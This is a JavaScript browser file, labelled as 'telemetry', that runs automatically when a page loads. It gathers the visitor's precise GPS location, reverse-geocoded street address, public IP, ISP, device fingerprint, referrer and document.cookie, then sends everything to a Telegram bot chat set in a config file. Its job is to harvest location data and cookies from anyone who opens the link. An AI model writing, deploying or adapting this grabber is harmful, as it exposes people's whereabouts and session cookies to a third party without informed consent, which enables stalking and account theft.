import {
  TELEGRAM_API_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
} from "../config.js";

// ==================== TELEMETRY TRACKING ====================
const telemetry = {
  errors: [],
  pageLoadTime: performance.now(),
};

// Bắt lỗi JavaScript
window.addEventListener("error", (event) => {
  telemetry.errors.push({
    type: "error",
    message: event.message,
    source: event.filename,
    line: event.lineno,
    column: event.colno,
    timestamp: new Date().toISOString(),
  });
});

// Bắt lỗi Promise
window.addEventListener("unhandledrejection", (event) => {
  telemetry.errors.push({
    type: "unhandledrejection",
    message:
      (event.reason && event.reason.message) ||
      (typeof event.reason === "string"
        ? event.reason
        : JSON.stringify(event.reason)),
    timestamp: new Date().toISOString(),
  });
});

// ==================== HELPER FUNCTIONS ====================
const escapeHtml = (value) =>
  String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");

const formatValue = (value) => {
  if (value === null || value === undefined) {
    return "Không có";
  }

  if (typeof value === "string") {
    return value.trim() === "" ? "Trống" : value;
  }

  if (Array.isArray(value)) {
    if (!value.length) {
      return "[]";
    }
    const hasObjects = value.some((item) => item && typeof item === "object");
    if (hasObjects) {
      try {
        return JSON.stringify(value, null, 2);
      } catch {
        return value.map((item) => String(item)).join(", ");
      }
    }
    return value.join(", ");
  }

  if (typeof value === "object") {
    try {
      return JSON.stringify(value, null, 2);
    } catch {
      return String(value);
    }
  }

  return String(value);
};

// ==================== NAVIGATION TIMING ====================
const getNavigationTiming = () => {
  const navigationEntry = performance.getEntriesByType("navigation")[0];
  if (!navigationEntry) return null;

  return {
    "DNS Lookup": Math.round(
      navigationEntry.domainLookupEnd - navigationEntry.domainLookupStart,
    ),
    "TCP Connection": Math.round(
      navigationEntry.connectEnd - navigationEntry.connectStart,
    ),
    "Time to First Byte": Math.round(
      navigationEntry.responseStart - navigationEntry.requestStart,
    ),
    "DOM Content Loaded": Math.round(
      navigationEntry.domContentLoadedEventEnd - navigationEntry.startTime,
    ),
    "Total Load Time": Math.round(
      navigationEntry.loadEventEnd - navigationEntry.startTime,
    ),
    "Transfer Size": `${Math.round(navigationEntry.transferSize / 1024)} KB`,
  };
};

// ==================== NETWORK INFO ====================
const getNetworkInfo = () => {
  const connection =
    navigator.connection ||
    navigator.mozConnection ||
    navigator.webkitConnection ||
    null;

  if (!connection) return null;

  return {
    "Effective Type": connection.effectiveType || "N/A",
    Downlink: connection.downlink ? `${connection.downlink} Mbps` : "N/A",
    RTT: connection.rtt ? `${connection.rtt} ms` : "N/A",
    "Save Data": connection.saveData ? "Yes" : "No",
  };
};

// ==================== CLIENT HINTS ====================
const fetchClientHints = async () => {
  if (
    !navigator.userAgentData ||
    !navigator.userAgentData.getHighEntropyValues
  ) {
    return null;
  }

  try {
    const highEntropy = await navigator.userAgentData.getHighEntropyValues([
      "architecture",
      "bitness",
      "model",
      "platform",
      "platformVersion",
      "uaFullVersion",
    ]);

    return {
      Brands:
        navigator.userAgentData.brands
          ?.map((b) => `${b.brand} ${b.version}`)
          .join(", ") || "N/A",
      Mobile: navigator.userAgentData.mobile ? "Yes" : "No",
      Platform: highEntropy.platform || "N/A",
      "Platform Version": highEntropy.platformVersion || "N/A",
      Architecture: highEntropy.architecture || "N/A",
      Bitness: highEntropy.bitness || "N/A",
      Model: highEntropy.model || "N/A",
      "Full Version": highEntropy.uaFullVersion || "N/A",
    };
  } catch (error) {
    telemetry.errors.push({
      type: "client-hints",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

// ==================== LOCATION INFO ====================
let geolocationPromise = null; // Cache promise để tránh multiple requests
let cachedLocation = null;
let cacheTimestamp = null;
const CACHE_DURATION = 5 * 60 * 1000; // 5 phút

const fetchIpAddress = async () => {
  try {
    const response = await fetch("https://api64.ipify.org?format=json");

    if (!response.ok) {
      throw new Error(`Failed to fetch IP address (${response.status})`);
    }

    const data = await response.json();
    return data.ip || null;
  } catch (error) {
    telemetry.errors.push({
      type: "ip-address",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

const reverseGeocodeCoordinates = async (latitude, longitude) => {
  try {
    const params = new URLSearchParams({
      lat: latitude,
      lon: longitude,
      format: "jsonv2",
      zoom: "16",
      addressdetails: "1",
    });

    const response = await fetch(
      `https://geocode.maps.co/reverse?${params.toString()}`,
    );

    if (!response.ok) {
      throw new Error(`Reverse geocoding failed (${response.status})`);
    }

    const data = await response.json();
    const address = data.address ?? {};

    return {
      addressLine: data.display_name || null,
      city:
        address.city ||
        address.town ||
        address.village ||
        address.hamlet ||
        null,
      state: address.state || null,
      postalCode: address.postcode || null,
      country: address.country || null,
    };
  } catch (error) {
    telemetry.errors.push({
      type: "reverse-geocode",
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

const getGeolocation = async () => {
  // Kiểm tra cache trước
  if (
    cachedLocation &&
    cacheTimestamp &&
    Date.now() - cacheTimestamp < CACHE_DURATION
  ) {
    console.log("📦 Using cached location data");
    return cachedLocation;
  }

  // Nếu đã có request đang chạy, trả về promise đó
  if (geolocationPromise) {
    console.log("🔄 Reusing existing geolocation request");
    return geolocationPromise;
  }

  geolocationPromise = new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ error: "Geolocation not supported by this browser" });
      return;
    }

    console.log("🌍 Starting new geolocation request");

    // Kiểm tra trạng thái quyền trước khi yêu cầu
    if (navigator.permissions) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((result) => {
          console.log("Geolocation permission status:", result.state);

          if (result.state === "denied") {
            resolve({
              error:
                "Geolocation permission permanently denied. Please enable location access in your browser settings.",
              permissionState: result.state,
            });
            return;
          }

          if (result.state === "granted") {
            console.log("✅ Permission already granted, getting location...");
          } else if (result.state === "prompt") {
            console.log("⚠️ Permission not set, will prompt user...");
          }

          // Tiếp tục với việc lấy vị trí
          requestGeolocation(resolve);
        })
        .catch(() => {
          // Fallback nếu permissions API không khả dụng
          console.log(
            "⚠️ Permissions API not available, proceeding with geolocation...",
          );
          requestGeolocation(resolve);
        });
    } else {
      // Fallback nếu permissions API không khả dụng
      console.log(
        "⚠️ Permissions API not supported, proceeding with geolocation...",
      );
      requestGeolocation(resolve);
    }
  });

  // Clear promise sau khi hoàn thành
  geolocationPromise.finally(() => {
    geolocationPromise = null;
  });

  return geolocationPromise;
};

const requestGeolocation = (resolve) => {
  const options = {
    enableHighAccuracy: true,
    timeout: 25000, // Tăng timeout lên 25 giây
    maximumAge: 300000, // Cache vị trí trong 5 phút để tránh yêu cầu quyền liên tục
  };

  console.log("🎯 Requesting geolocation with options:", options);
  console.log("🔍 Current protocol:", window.location.protocol);
  console.log("🔍 Current host:", window.location.host);

  let resolved = false; // Flag để tránh resolve nhiều lần

  navigator.geolocation.getCurrentPosition(
    (position) => {
      if (resolved) {
        console.log("⚠️ Geolocation success but already resolved");
        return;
      }
      resolved = true;

      const { latitude, longitude, accuracy } = position.coords;
      console.log("✅ Geolocation success:", { latitude, longitude, accuracy });

      const result = {
        latitude: latitude.toFixed(6),
        longitude: longitude.toFixed(6),
        accuracy: Math.round(accuracy),
      };

      // Cache kết quả
      cachedLocation = result;
      cacheTimestamp = Date.now();
      console.log("💾 Location cached for", CACHE_DURATION / 1000, "seconds");

      resolve(result);
    },
    (error) => {
      if (resolved) {
        console.log("⚠️ Geolocation error but already resolved");
        return;
      }
      resolved = true;

      let errorMessage = "Unknown geolocation error";
      let userFriendlyMessage = "Unable to get location";

      switch (error.code) {
        case 1: // PERMISSION_DENIED
          errorMessage = "Geolocation permission denied";
          userFriendlyMessage =
            "Location access was denied. Please allow location access to get your coordinates.";
          break;
        case 2: // POSITION_UNAVAILABLE
          errorMessage = "Location information unavailable";
          userFriendlyMessage =
            "Unable to determine your location. Please check if location services are enabled.";
          break;
        case 3: // TIMEOUT
          errorMessage = "Geolocation request timeout";
          userFriendlyMessage = "Location request timed out. Please try again.";
          break;
        default:
          errorMessage = `Geolocation error (code: ${error.code}): ${
            error.message || "Unknown error"
          }`;
          userFriendlyMessage =
            "An error occurred while getting your location.";
          break;
      }

      console.warn("❌ Geolocation error:", errorMessage, error);
      resolve({
        error: errorMessage,
        userMessage: userFriendlyMessage,
        errorCode: error.code,
      });
    },
    options,
  );
};

const fetchPublicIpInfo = async () => {
  const [geoResult, ipAddress] = await Promise.all([
    getGeolocation(),
    fetchIpAddress(),
  ]);

  if (geoResult.error) {
    telemetry.errors.push({
      type: "geolocation",
      message: geoResult.error,
    });

    // Fallback: Thử lấy thông tin IP nếu geolocation thất bại
    try {
      console.log("🔄 Geolocation failed, trying IP fallback...");
      const ipResponse = await fetch("https://ipapi.co/json/", {
        timeout: 10000,
      });

      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        console.log("✅ IP fallback successful:", ipData);
        const summaryParts = [
          ipData.city,
          ipData.region,
          ipData.country_name,
        ].filter(Boolean);

        return {
          Status: "Location obtained (via IP)",
          Coordinates: `${ipData.latitude}, ${ipData.longitude}`,
          Accuracy: "Approximate (IP-based)",
          Latitude: ipData.latitude,
          Longitude: ipData.longitude,
          Service: "ipapi.co",
          Address:
            summaryParts.join(", ") ||
            `${ipData.latitude}, ${ipData.longitude} (IP estimate)`,
          City: ipData.city || "N/A",
          Region: ipData.region || "N/A",
          Country: ipData.country_name || "N/A",
          PostalCode: ipData.postal || "N/A",
          IPAddress: ipData.ip || ipAddress || "N/A",
          Timezone: ipData.timezone || "N/A",
          ISP: ipData.org || ipData.org_name || "N/A",
          Note: "Location determined from IP address (less accurate than GPS)",
        };
      }
    } catch (ipError) {
      console.warn("⚠️ IP fallback also failed:", ipError);
      telemetry.errors.push({
        type: "ip-fallback",
        message: ipError instanceof Error ? ipError.message : String(ipError),
      });
    }

    // Cải thiện thông báo lỗi dựa trên loại lỗi
    let userInstructions = "";
    if (geoResult.errorCode === 1) {
      userInstructions =
        "Để bật quyền truy cập vị trí:\n• Chrome/Edge: Nhấp vào biểu tượng khóa bên trái thanh địa chỉ → Cho phép vị trí\n• Firefox: Nhấp vào biểu tượng vị trí bên trái thanh địa chỉ → Cho phép\n• Safari: Safari → Tùy chọn → Bảo mật → Cho phép truy cập vị trí\n• Hoặc kiểm tra cài đặt trình duyệt của bạn";
    } else if (geoResult.errorCode === 2) {
      userInstructions =
        "Vui lòng kiểm tra:\n• GPS/Location Services đã được bật trên thiết bị\n• Kết nối internet ổn định\n• Thử lại sau vài giây";
    } else if (geoResult.errorCode === 3) {
      userInstructions = "Yêu cầu vị trí bị timeout. Vui lòng thử lại.";
    }

    return {
      Status: "Location unavailable",
      Reason: geoResult.userMessage || geoResult.error,
      ErrorCode: geoResult.errorCode || "Unknown",
      PermissionState: geoResult.permissionState || "Unknown",
      IPAddress: ipAddress || "Không xác định",
      Note:
        userInstructions ||
        "Location data not available. Please allow location access when prompted.",
      Instructions: userInstructions,
    };
  }

  const addressInfo = await reverseGeocodeCoordinates(
    geoResult.latitude,
    geoResult.longitude,
  );

  const summaryParts = [];
  if (addressInfo?.addressLine) {
    summaryParts.push(addressInfo.addressLine);
  }
  summaryParts.push(`${geoResult.latitude}, ${geoResult.longitude}`);

  return {
    Status: "Location obtained",
    Coordinates: `${geoResult.latitude}, ${geoResult.longitude}`,
    Accuracy: `±${geoResult.accuracy}m`,
    Latitude: geoResult.latitude,
    Longitude: geoResult.longitude,
    Address: summaryParts.join(" | "),
    City: addressInfo?.city || "N/A",
    Region: addressInfo?.state || "N/A",
    Country: addressInfo?.country || "N/A",
    PostalCode: addressInfo?.postalCode || "N/A",
    IPAddress: ipAddress || "N/A",
    Service: "navigator.geolocation",
  };
};

// ==================== SCREEN & DEVICE INFO ====================
const getScreenInfo = () => {
  return {
    "Screen Resolution": `${screen.width}x${screen.height}`,
    "Available Screen": `${screen.availWidth}x${screen.availHeight}`,
    "Color Depth": `${screen.colorDepth}-bit`,
    "Pixel Ratio": window.devicePixelRatio || 1,
    "Viewport Size": `${window.innerWidth}x${window.innerHeight}`,
    Orientation: screen.orientation?.type || "N/A",
  };
};

// ==================== BROWSER FEATURES ====================
const getBrowserFeatures = () => {
  return {
    "Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
    "Do Not Track": navigator.doNotTrack || "Not set",
    "Online Status": navigator.onLine ? "Online" : "Offline",
    "Touch Support": "ontouchstart" in window ? "Yes" : "No",
    "Local Storage":
      typeof localStorage !== "undefined" ? "Available" : "Not available",
    "Session Storage":
      typeof sessionStorage !== "undefined" ? "Available" : "Not available",
    WebGL: (() => {
      const canvas = document.createElement("canvas");
      return canvas.getContext("webgl") ||
        canvas.getContext("experimental-webgl")
        ? "Supported"
        : "Not supported";
    })(),
  };
};

// ==================== COLLECT ALL CLIENT CONTEXT ====================
const collectClientContext = async () => {
  console.log("🔍 Starting collectClientContext...");

  console.log("📍 Fetching location info...");
  const [ipInfo, clientHints] = await Promise.all([
    fetchPublicIpInfo(),
    fetchClientHints(),
  ]);

  console.log("📍 Location info:", ipInfo);
  console.log("💡 Client hints:", clientHints);

  const context = {
    timestamp: new Date().toISOString(),
    ipInfo,
    referrer: document.referrer || "Direct visit (no referrer)",
    currentUrl: window.location.href,
    language: navigator.language || "N/A",
    languages: navigator.languages?.join(", ") || "N/A",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
    cookies: document.cookie || "No cookies",
    userAgent: navigator.userAgent,
    platform: navigator.platform || "N/A",
    vendor: navigator.vendor || "N/A",
    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
    maxTouchPoints: navigator.maxTouchPoints || 0,
    screenInfo: getScreenInfo(),
    networkInfo: getNetworkInfo(),
    clientHints,
    navigationTiming: getNavigationTiming(),
    browserFeatures: getBrowserFeatures(),
    errors: telemetry.errors.length > 0 ? telemetry.errors : [],
  };

  console.log("✅ Context collection completed");
  return context;
};

// ==================== BUILD TELEGRAM MESSAGE ====================
const buildTelegramMessage = (context) => {
  const lines = [
    `🔍 <b>Thông tin Client Telemetry</b>`,
    "",
    `⏰ <b>Thời gian:</b> ${new Date(context.timestamp).toLocaleString(
      "vi-VN",
    )}`,
    `🌐 <b>URL:</b> ${escapeHtml(context.currentUrl)}`,
  ];

  // Location Information
  if (context.ipInfo && !context.ipInfo.error) {
    lines.push("", "📍 <b>Thông tin Vị trí</b>");
    Object.entries(context.ipInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  } else if (context.ipInfo) {
    lines.push("", "📍 <b>Thông tin Vị trí</b>");
    Object.entries(context.ipInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Browser & System
  lines.push(
    "",
    "🖥️ <b>Trình duyệt & Hệ thống</b>",
    `  • User Agent: ${escapeHtml(context.userAgent)}`,
    `  • Platform: ${escapeHtml(String(context.platform))}`,
    `  • Vendor: ${escapeHtml(String(context.vendor))}`,
    `  • Language: ${escapeHtml(context.language)}`,
    `  • All Languages: ${escapeHtml(context.languages)}`,
    `  • Timezone: ${escapeHtml(context.timezone)}`,
    `  • CPU Cores: ${context.hardwareConcurrency}`,
    `  • Touch Points: ${context.maxTouchPoints}`,
  );

  // Screen Info
  if (context.screenInfo) {
    lines.push("", "📱 <b>Màn hình & Thiết bị</b>");
    Object.entries(context.screenInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Client Hints
  if (context.clientHints) {
    lines.push("", "💡 <b>Client Hints (High Entropy)</b>");
    Object.entries(context.clientHints).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Network Info
  if (context.networkInfo) {
    lines.push("", "🌐 <b>Thông tin Mạng</b>");
    Object.entries(context.networkInfo).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Navigation Timing
  if (context.navigationTiming) {
    lines.push("", "⚡ <b>Performance Timing (ms)</b>");
    Object.entries(context.navigationTiming).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Browser Features
  if (context.browserFeatures) {
    lines.push("", "✨ <b>Tính năng Trình duyệt</b>");
    Object.entries(context.browserFeatures).forEach(([key, value]) => {
      lines.push(`  • ${key}: ${escapeHtml(String(value))}`);
    });
  }

  // Referrer & Cookies
  lines.push(
    "",
    "🔗 <b>Navigation & Tracking</b>",
    `  • Referrer: ${escapeHtml(context.referrer)}`,
    `  • Cookies: ${escapeHtml(context.cookies)}`,
  );

  // Errors
  if (context.errors.length > 0) {
    lines.push("", "⚠️ <b>Lỗi đã bắt được</b>");
    context.errors.forEach((err, idx) => {
      lines.push(`  ${idx + 1}. [${err.type}] ${escapeHtml(err.message)}`);
    });
  } else {
    lines.push("", "✅ <b>Không có lỗi</b>");
  }

  return lines.join("\n");
};

// ==================== SEND TO TELEGRAM ====================
const sendToTelegram = async (message) => {
  console.log("=== Sending to Telegram ===");
  console.log("Message length:", message.length);
  console.log("Message preview:", message.substring(0, 200) + "...");

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };

  console.log("Payload:", payload);

  const response = await fetch(
    `${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    },
  );

  console.log("Response status:", response.status);
  console.log(
    "Response headers:",
    Object.fromEntries(response.headers.entries()),
  );

  if (!response.ok) {
    const errorText = await response.text();
    console.error("Response error text:", errorText);
    throw new Error(
      `HTTP ${response.status}: ${response.statusText} - ${errorText}`,
    );
  }

  const result = await response.json();
  console.log("Telegram API result:", result);

  if (!result.ok) {
    throw new Error(result.description ?? "Telegram API error");
  }

  console.log("✅ Message sent successfully!");
  return result;
};

// ==================== UI UPDATES ====================
const updateUI = (status, message, context = null) => {
  const spinner = document.querySelector(".spinner");
  const statusText = document.getElementById("status-text");
  const infoDisplay = document.getElementById("info-display");

  if (spinner) spinner.style.display = status === "loading" ? "block" : "none";
  if (statusText) {
    statusText.textContent = message;
    statusText.className =
      status === "error" ? "error" : status === "success" ? "success" : "";
  }

  if (context && infoDisplay) {
    infoDisplay.style.display = "block";
    infoDisplay.innerHTML = generateInfoHTML(context);
  }
};

const generateInfoHTML = (context) => {
  const items = [];

  if (context.ipInfo) {
    if (context.ipInfo.Coordinates) {
      // Geolocation thành công
      items.push(
        `<div class="info-item success"><span class="info-label">Trạng thái:</span> ${escapeHtml(
          context.ipInfo.Status || "N/A",
        )}</div>`,
      );
      items.push(
        `<div class="info-item"><span class="info-label">Tọa độ:</span> ${escapeHtml(
          context.ipInfo.Coordinates || "N/A",
        )}</div>`,
      );
      items.push(
        `<div class="info-item"><span class="info-label">Độ chính xác:</span> ${escapeHtml(
          context.ipInfo.Accuracy || "N/A",
        )}</div>`,
      );
      if (context.ipInfo.Address) {
        items.push(
          `<div class="info-item"><span class="info-label">Địa chỉ:</span> ${escapeHtml(
            context.ipInfo.Address,
          )}</div>`,
        );
      }
      if (
        context.ipInfo.City ||
        context.ipInfo.Region ||
        context.ipInfo.PostalCode ||
        context.ipInfo.Country
      ) {
        const locationParts = [
          context.ipInfo.City,
          context.ipInfo.Region,
          context.ipInfo.PostalCode,
          context.ipInfo.Country,
        ]
          .filter((value) => value && value !== "N/A")
          .join(", ");

        if (locationParts) {
          items.push(
            `<div class="info-item"><span class="info-label">Khu vực:</span> ${escapeHtml(
              locationParts,
            )}</div>`,
          );
        }
      }
      if (context.ipInfo.IPAddress) {
        items.push(
          `<div class="info-item"><span class="info-label">IP công khai:</span> ${escapeHtml(
            context.ipInfo.IPAddress,
          )}</div>`,
        );
      }
      if (context.ipInfo.Timezone) {
        items.push(
          `<div class="info-item"><span class="info-label">Múi giờ:</span> ${escapeHtml(
            context.ipInfo.Timezone,
          )}</div>`,
        );
      }
      if (context.ipInfo.ISP) {
        items.push(
          `<div class="info-item"><span class="info-label">Nhà mạng:</span> ${escapeHtml(
            context.ipInfo.ISP,
          )}</div>`,
        );
      }
      if (context.ipInfo.Service) {
        items.push(
          `<div class="info-item"><span class="info-label">Nguồn dữ liệu:</span> ${escapeHtml(
            context.ipInfo.Service,
          )}</div>`,
        );
      }
    } else {
      // Geolocation thất bại - hiển thị thông tin lỗi chi tiết
      items.push(
        `<div class="info-item error"><span class="info-label">Trạng thái:</span> ${escapeHtml(
          context.ipInfo.Status || "N/A",
        )}</div>`,
      );
      items.push(
        `<div class="info-item"><span class="info-label">Lý do:</span> ${escapeHtml(
          context.ipInfo.Reason || "N/A",
        )}</div>`,
      );
      if (
        context.ipInfo.PermissionState &&
        context.ipInfo.PermissionState !== "Unknown"
      ) {
        items.push(
          `<div class="info-item"><span class="info-label">Quyền truy cập:</span> ${escapeHtml(
            context.ipInfo.PermissionState,
          )}</div>`,
        );
      }
      if (context.ipInfo.Instructions) {
        items.push(
          `<div class="info-item instructions">
            <span class="info-label">Hướng dẫn khắc phục:</span>
            <div class="instructions-content">${escapeHtml(
              context.ipInfo.Instructions,
            ).replace(/\n/g, "<br>")}</div>
          </div>`,
        );
      } else if (context.ipInfo.Note) {
        items.push(
          `<div class="info-item"><span class="info-label">Ghi chú:</span> ${escapeHtml(
            context.ipInfo.Note,
          )}</div>`,
        );
      }
      if (context.ipInfo.IPAddress) {
        items.push(
          `<div class="info-item"><span class="info-label">IP công khai:</span> ${escapeHtml(
            context.ipInfo.IPAddress,
          )}</div>`,
        );
      }
      if (context.ipInfo.Service) {
        items.push(
          `<div class="info-item"><span class="info-label">Nguồn dữ liệu:</span> ${escapeHtml(
            context.ipInfo.Service,
          )}</div>`,
        );
      }
    }
  }

  items.push(
    `<div class="info-item"><span class="info-label">Trình duyệt:</span> ${escapeHtml(
      context.platform,
    )} - ${escapeHtml(context.language)}</div>`,
  );
  items.push(
    `<div class="info-item"><span class="info-label">Referrer:</span> ${escapeHtml(
      context.referrer,
    )}</div>`,
  );

  if (context.screenInfo) {
    items.push(
      `<div class="info-item"><span class="info-label">Màn hình:</span> ${escapeHtml(
        String(context.screenInfo["Screen Resolution"]),
      )}</div>`,
    );
  }

  return items.join("");
};

// ==================== CHECK CONFIG ====================
const isConfigured = () =>
  Boolean(
    TELEGRAM_API_URL &&
      TELEGRAM_API_URL.startsWith("http") &&
      TELEGRAM_BOT_TOKEN &&
      TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN" &&
      TELEGRAM_CHAT_ID &&
      TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID",
  );

// ==================== MAIN AUTO-SEND LOGIC ====================
const autoSendTelemetry = async () => {
  try {
    console.log("🚀 Starting autoSendTelemetry...");
    updateUI("loading", "Đang thu thập thông tin client...");

    // Check config first
    console.log("🔧 Checking configuration...");
    if (!isConfigured()) {
      console.error("❌ Configuration check failed");
      updateUI("error", "Chưa cấu hình Telegram! Vui lòng cập nhật config.js");
      return;
    }
    console.log("✅ Configuration check passed");

    // Collect all data
    console.log("📊 Collecting client context...");
    const context = await collectClientContext();
    console.log("📊 Context collected:", context);

    // Display collected info
    updateUI("loading", "Đã thu thập xong, đang gửi đến Telegram...", context);

    // Build and send message
    console.log("📝 Building Telegram message...");
    const message = buildTelegramMessage(context);
    console.log("📝 Message built, length:", message.length);

    console.log("📤 Sending to Telegram...");
    await sendToTelegram(message);

    console.log("🎉 Success! Message sent to Telegram");
    updateUI("success", "✅ Đã gửi thành công đến Telegram!", context);
  } catch (error) {
    console.error("💥 Error in autoSendTelemetry:", error);
    console.error("Error stack:", error.stack);
    updateUI("error", `❌ Lỗi: ${error.message}`);
  }
};

// ==================== AUTO-RUN ON PAGE LOAD ====================
// Wait for DOM and network to be ready, then auto-send
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", () => {
    setTimeout(autoSendTelemetry, 500); // Small delay to ensure all metrics are captured
  });
} else {
  setTimeout(autoSendTelemetry, 500);
}
